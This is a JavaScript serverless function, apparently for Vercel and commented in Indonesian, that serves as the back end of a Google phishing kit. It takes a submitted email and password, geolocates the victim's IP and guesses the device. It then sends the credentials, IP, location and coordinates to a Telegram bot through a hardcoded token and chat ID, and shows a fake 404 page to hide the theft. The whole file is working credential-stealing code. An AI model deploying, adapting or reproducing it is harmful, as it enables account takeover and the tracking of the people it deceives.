export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const { email, password } = req.body;

    // Ambil IP & User Agent dari header Vercel
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    // Ambil geolokasi dari IP
    let geoData = {};
    let locationString = 'Tidak diketahui';
    let lat = null, lon = null;

    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,region,lat,lon,isp,org,as,proxy,query`);
        geoData = await geoRes.json();
        if (geoData.status === 'success') {
            locationString = `${geoData.city}, ${geoData.country} (${geoData.isp})`;
            lat = geoData.lat;
            lon = geoData.lon;
        }
    } catch (err) {
        console.error('Geo gagal:', err);
    }

    // Deteksi device dari user agent
    let device = '❓ Unknown';
    if (userAgent.includes('iPhone')) device = '📱 iPhone';
    else if (userAgent.includes('iPad')) device = '📱 iPad';
    else if (userAgent.includes('Android')) device = '🤖 Android';
    else if (userAgent.includes('Windows')) device = '💻 Windows';
    else if (userAgent.includes('Mac')) device = '🍎 Mac';
    else if (userAgent.includes('Linux')) device = '🐧 Linux';

    // Format pesan Telegram
    const message = `🎭 *GOOGLE PHISHING - VERCEL* 🎭\n`;
    const text = message +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📅 Waktu: ${timestamp}\n\n` +
        `🔐 *LOGIN*\n` +
        `📧 Email: \`${email}\`\n` +
        `🔑 Password: \`${password}\`\n\n` +
        `🌐 *NETWORK*\n` +
        `🖥️ IP: \`${ip}\`\n` +
        `📍 Lokasi: ${locationString}\n` +
        `📡 ISP: ${geoData.isp || 'unknown'}\n\n` +
        `📱 *DEVICE*\n` +
        `${device}\n` +
        `🔧 UA: \`${userAgent}\``;

    // Kirim ke Telegram
    const botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
    const chatId = "8753510792";

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            })
        });

        // Kirim lokasi juga kalo ada koordinat
        if (lat && lon) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: lat,
                    longitude: lon
                })
            });
        }
    } catch (err) {
        console.error('Telegram error:', err);
    }

    // Kembalikan halaman 404
    res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head><title>404 Not Found</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px">
            <h1>404</h1>
            <p>The requested URL was not found on this server.</p>
        </body>
        </html>
    `);
}
